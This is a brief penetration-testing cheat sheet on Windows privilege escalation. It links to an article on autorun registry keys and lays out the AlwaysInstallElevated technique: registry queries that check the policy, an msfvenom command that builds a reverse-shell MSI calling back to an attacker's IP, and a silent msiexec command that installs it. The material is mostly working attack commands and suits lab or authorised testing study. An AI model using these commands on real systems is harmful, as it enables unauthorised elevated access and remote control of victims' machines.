# Autorun
https://juggernaut-sec.com/autorun-startup-registry-keys/
Requires administrator to run the program!

# AlwaysInstalledElevated
Windows installer files `.msi` are used to install applications on the system. These files can be configured to run with *higher privileges* if the installation requires *administrator privileges*.

```powershell
# These two registry values must be "0x1"
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```sh
msfvenom -p windows/shell_reverse_tcp lhost=[IP] lport=4444 -f msi -o setup.msi
```
```powershell
# Place ‘setup.msi’ in ‘C:\Temp’.
msiexec /quiet /qn /norestart /i C:\Temp\setup.msi
```

